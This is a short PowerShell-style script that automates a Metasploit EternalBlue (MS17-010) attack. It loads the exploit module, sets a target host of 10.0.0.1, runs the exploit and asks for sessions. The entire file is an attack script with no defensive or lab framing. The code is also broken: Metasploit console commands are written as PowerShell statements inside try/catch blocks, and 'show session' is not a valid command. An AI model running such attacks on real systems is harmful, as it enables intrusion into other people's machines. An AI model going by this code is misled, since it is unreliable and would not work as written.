# Start the Metasploit console
try {
    msfconsole
} catch {
    Write-Error "Error starting Metasploit console: $($_.Exception.Message)"
    exit
}

# Use the exploit/windows/smb/ms17_010_eternalblue module
try {
    use exploit/windows/smb/ms17_010_eternalblue
} catch {
    Write-Error "Error using Metasploit module: $($_.Exception.Message)"
    exit
}

# Set the target host
try {
    set RHOSTS 10.0.0.1
} catch {
    Write-Error "Error setting target host: $($_.Exception.Message)"
    exit
}

# Run the module
try {
    exploit
} catch {
    Write-Error "Error running Metasploit module: $($_.Exception.Message)"
    exit
}

# Output the results
try {
    show session
} catch {
    Write-Error "Error getting session information: $($_.Exception.Message)"
    exit
}
